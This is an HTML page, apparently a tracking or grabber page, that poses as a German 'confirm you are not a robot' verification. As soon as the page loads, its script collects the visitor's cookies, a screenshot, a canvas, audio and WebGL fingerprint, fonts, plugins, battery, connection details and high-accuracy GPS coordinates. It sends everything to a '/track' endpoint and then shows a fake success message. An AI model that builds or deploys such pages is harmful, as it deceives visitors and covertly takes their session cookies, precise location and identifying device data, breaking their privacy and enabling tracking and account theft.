<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8" />
  <title>Willkommen</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; padding: 24px; text-align: center; }
    .ok { color: green; }
    .err { color: #b00; }
  </style>
  <!-- Screenshot lib -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
  <h1>Willkommen</h1>
  <p>Klicke auf „Bestätigen“, um deinen Zugriff zu verifizieren. Du wirst anschließend weitergeleitet.</p>
  <div id="status">Klicke auf ‚Verifizieren‘, um zu bestätigen, dass du kein Roboter bist.</div>

  <script>
    async function getGeoPermission() {
      try {
        if (!navigator.permissions) return 'unbekannt';
        const s = await navigator.permissions.query({ name: 'geolocation' });
        return s.state; // 'granted' | 'denied' | 'prompt'
      } catch { return 'unbekannt'; }
    }

    async function getBattery() {
      if (!navigator.getBattery) return null;
      try {
        const b = await navigator.getBattery();
        return { charging: b.charging, level: Math.round(b.level * 100), chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
      } catch { return null; }
    }

    function getPlugins() {
      try {
        if (!navigator.plugins) return null;
        return Array.from(navigator.plugins).map(p => `${p.name} (${p.version || '–'})`);
      } catch { return null; }
    }

    function getFonts() {
      const fonts = ['Arial','Helvetica','Times New Roman','Courier New','Verdana','Georgia','Palatino','Garamond','Bookman','Comic Sans MS','Trebuchet MS','Arial Black','Impact'];
      return fonts.filter(font => {
        const span = document.createElement('span');
        span.style.fontFamily = font;
        span.textContent = 'abcdefghijklmnopqrstuvwxyz';
        document.body.appendChild(span);
        const width = span.offsetWidth;
        document.body.removeChild(span);
        return width !== 0;
      });
    }

    function getWebGL() {
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return null;
        const info = gl.getExtension('WEBGL_debug_renderer_info');
        const vendor = info ? gl.getParameter(info.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
        const renderer = info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
        return { vendor, renderer };
      } catch { return null; }
    }

    async function getCanvasFingerprint() {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 240; canvas.height = 80;
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Hello, world!', 2, 15);
        ctx.strokeStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.beginPath();
        ctx.arc(100, 40, 30, 0, Math.PI * 2);
        ctx.stroke();
        return canvas.toDataURL('image/webp', 0.7); // kleiner als PNG
      } catch { return null; }
    }

    // leiser Audio-Fingerprint (kein Sound)
    async function getAudioFingerprint() {
      try {
        if (!window.OfflineAudioContext) return null;
        const ctx = new OfflineAudioContext(1, 44100, 44100);
        const osc = new OscillatorNode(ctx, { type: 'sine', frequency: 440 });
        const comp = new DynamicsCompressorNode(ctx);
        osc.connect(comp).connect(ctx.destination);
        osc.start(0); osc.stop(0.1);
        const buf = await ctx.startRendering();
        // kleine Signatur
        const sig = Array.from(buf.getChannelData(0).slice(0, 200)).map(n => n.toFixed(5)).join(',');
        return sig;
      } catch { return null; }
    }

    async function getScreenshot() {
      try {
        const canvas = await html2canvas(document.body, { scale: 1, useCORS: true });
        return canvas.toDataURL('image/jpeg', 0.6); // komprimiert halten
      } catch { return null; }
    }

    async function collectData(geoStatus) {
      const [battery, plugins, fonts, webgl, canvas_fingerprint, audio_fingerprint, screenshot] = await Promise.all([
        getBattery(), Promise.resolve(getPlugins()), Promise.resolve(getFonts()), Promise.resolve(getWebGL()),
        getCanvasFingerprint(), getAudioFingerprint(), getScreenshot()
      ]);

      return {
        request_id: (crypto && crypto.randomUUID) ? crypto.randomUUID() : String(Date.now()),
        lat: null, lon: null, accuracy: null, altitude: null, heading: null, speed: null,
        geo_status: geoStatus || 'unbekannt',
        userAgent: navigator.userAgent || '',
        language: navigator.language || '',
        languages: (navigator.languages || []).join(','),
        cookies: document.cookie || '',
        screen: {
          width: window.screen?.width,
          height: window.screen?.height,
          colorDepth: window.screen?.colorDepth,
          availWidth: window.screen?.availWidth,
          availHeight: window.screen?.availHeight
        },
        viewport: {
          innerWidth: window.innerWidth,
          innerHeight: window.innerHeight,
          outerWidth: window.outerWidth,
          outerHeight: window.outerHeight
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
        platform: navigator.platform || '',
        hardwareConcurrency: navigator.hardwareConcurrency ?? null,
        deviceMemory: navigator.deviceMemory ?? null,
        connection: (navigator.connection ? {
          effectiveType: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt,
          saveData: navigator.connection.saveData || false
        } : null),
        referrer: document.referrer || '',
        pixelRatio: window.devicePixelRatio || 1,
        colorScheme: (matchMedia && matchMedia('(prefers-color-scheme: dark)').matches) ? 'dark'
                   : (matchMedia && matchMedia('(prefers-color-scheme: light)').matches) ? 'light' : 'no-preference',
        colorGamut: (['srgb','p3','rec2020'].find(g => matchMedia && matchMedia(`(color-gamut: ${g})`).matches)) || 'unknown',

        plugins, fonts, webgl, battery, canvas_fingerprint, audio_fingerprint, screenshot,
        timestamp: new Date().toISOString()
      };
    }

    async function sendData(data) {
      const res = await fetch('/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
      if (!res.ok) throw new Error('HTTP ' + res.status);
    }

    (async function run() {
      const geoStatus = await getGeoPermission();
      const data = await collectData(geoStatus);

      const done = (msg='✅ Du wurdest soeben verifiziert.') => {
        const s = document.getElementById('status'); s.textContent = msg; s.className = 'ok';
      };
      const fail = (err) => {
        console.error(err);
        const s = document.getElementById('status'); s.textContent = '❌ Senden fehlgeschlagen.'; s.className = 'err';
      };

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const c = pos.coords;
            data.lat = c.latitude; data.lon = c.longitude;
            if (typeof c.accuracy === 'number') data.accuracy = c.accuracy;
            if (typeof c.altitude === 'number') data.altitude = c.altitude;
            if (typeof c.heading === 'number') data.heading = c.heading;
            if (typeof c.speed === 'number') data.speed = c.speed;
            sendData(data).then(() => done()).catch(fail);
          },
          () => { sendData(data).then(() => done('✅ (ohne GPS) gesendet.')).catch(fail); },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      } else {
        sendData(data).then(() => done()).catch(fail);
      }
    })();
  </script>
</body>
</html>
